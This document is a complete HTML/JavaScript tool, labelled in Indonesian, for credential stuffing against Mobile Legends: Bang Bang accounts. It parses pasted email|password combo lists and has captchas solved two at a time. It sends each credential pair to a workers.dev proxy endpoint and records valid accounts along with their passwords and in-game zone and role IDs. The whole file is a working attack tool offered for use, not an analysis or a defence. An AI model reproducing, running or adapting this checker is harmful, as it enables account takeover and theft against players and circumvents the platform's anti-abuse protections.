<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>MLBB Checker 2 Captcha per Batch</title>
<script src="https://cstaticdun.126.net/load.min.js"></script>
<style>
  body { font-family: Arial; max-width: 900px; margin: auto; padding: 20px; }
  textarea { width: 100%; height: 180px; font-family: monospace; }
  #captcha-container { display: flex; gap: 20px; margin: 12px 0; }
  .captcha-box { flex: 1; }
  #log { background: #111; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; }
  .ok { color: #7CFC00; }
  .bad { color: #FF6B6B; }
  .info { color: #FFD866; }
</style>
</head>
<body>

<h2>MLBB Checker 2 Captcha per Batch</h2>
<p>Masukkan list akun (email|password atau email:password). Saat halaman dimuat, captcha langsung muncul untuk 2 akun pertama.</p>

<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com:Pass456"></textarea>
<div id="status" style="margin-top:10px;"></div>

<div id="captcha-container">
  <div class="captcha-box">
    <h4>Captcha Akun 1</h4>
    <div id="captcha-root-1"></div>
  </div>
  <div class="captcha-box">
    <h4>Captcha Akun 2</h4>
    <div id="captcha-root-2"></div>
  </div>
</div>

<h3>Log:</h3>
<div id="log"></div>

<script>
const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; // ganti dengan captchaId asli
const WORKER_URL = "https://hidayat.bonar7527.workers.dev";

let combos = [];
let currentIndex = 0;
let validAccounts = [];
let neCaptchaInstance1 = null;
let neCaptchaInstance2 = null;

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function appendLog(text, cls) {
  const time = new Date().toLocaleTimeString();
  const div = document.createElement("div");
  div.textContent = `[${time}] ${text}`;
  if(cls) div.className = cls;
  logEl.appendChild(div);
  logEl.scrollTop = logEl.scrollHeight;
}

function parseCombos(text) {
  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
    if(line.includes("|")) {
      const [e,p] = line.split("|",2);
      return { email: e.trim(), password: p.trim() };
    } else if(line.includes(":")) {
      const [e,p] = line.split(":",2);
      return { email: e.trim(), password: p.trim() };
    } else {
      appendLog(`Format salah: ${line}`, "info");
      return null;
    }
  }).filter(Boolean);
}

function initCaptcha(elementId) {
  return new Promise((resolve, reject) => {
    try {
      initNECaptcha({
        captchaId: CAPTCHA_ID,
        element: elementId,
        mode: "embed",
        width: "320px",
        onVerify(err, data) {
          if(err) {
            appendLog(`Captcha error: ${JSON.stringify(err)}`, "bad");
            reject(err);
            return;
          }
          if(!data || !data.validate) {
            appendLog("Token captcha kosong", "info");
            reject("no token");
            return;
          }
          resolve(data.validate);
        },
        onLoad(instance) {
          if(elementId.includes("1")) neCaptchaInstance1 = instance;
          else neCaptchaInstance2 = instance;
        }
      });
    } catch(e) {
      reject(e);
    }
  });
}

async function checkOneAccount(account, token) {
  appendLog(`Cek akun ${account.email}`, "info");
  try {
    const form = new URLSearchParams();
    form.append("email", account.email);
    form.append("password", account.password);
    form.append("e_captcha", token);

    const resp = await fetch(WORKER_URL + "/check", {
      method: "POST",
      body: form,
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });

    if(!resp.ok) {
      appendLog(`HTTP error ${resp.status} untuk ${account.email}`, "bad");
      return;
    }
    const data = await resp.json();

    if(data.code === 0 && data.data) {
      const zoneId = data.data.zoneId || "N/A";
      const roleId = data.data.roleId || "N/A";
      appendLog(`VALID => ${account.email} | ZoneID: ${zoneId} | RoleID: ${roleId}`, "ok");
      validAccounts.push(`${account.email}|${account.password} | ZoneID:${zoneId} | RoleID:${roleId}`);
    } else if(data.code === 1004) {
      appendLog(`NOT FOUND => ${account.email}`, "bad");
    } else if(data.code === 1005) {
      appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
    } else {
      appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
    }
  } catch(e) {
    appendLog(`Error cek ${account.email}: ${e}`, "bad");
  }
}

async function processBatch() {
  if(currentIndex >= combos.length) {
    appendLog("Selesai semua akun", "info");
    statusEl.textContent = "Selesai";
    return;
  }

  const acc1 = combos[currentIndex];
  const acc2 = combos[currentIndex+1] || null;

  statusEl.textContent = `Batch ${Math.floor(currentIndex/2)+1}: ${acc1.email}${acc2 ? " & " + acc2.email : ""}`;

  document.getElementById("captcha-root-1").innerHTML = "";
  document.getElementById("captcha-root-2").innerHTML = "";

  try {
    const promises = [initCaptcha("#captcha-root-1")];
    if(acc2) promises.push(initCaptcha("#captcha-root-2"));

    const tokens = await Promise.all(promises);

    await checkOneAccount(acc1, tokens[0]);
    if(acc2) await checkOneAccount(acc2, tokens[1]);

  } catch(e) {
    appendLog(`Error batch: ${e}`, "bad");
  }

  currentIndex += acc2 ? 2 : 1;
  setTimeout(processBatch, 500);
}

document.addEventListener("NECaptchaReady", function() {
  combos = parseCombos(document.getElementById("combo").value);
  if(combos.length === 0) {
    appendLog("Tidak ada akun untuk dicek", "info");
    return;
  }
  appendLog(`Mulai cek ${combos.length} akun (2 per batch).`, "info");
  processBatch();
});
</script>

</body>
</html>
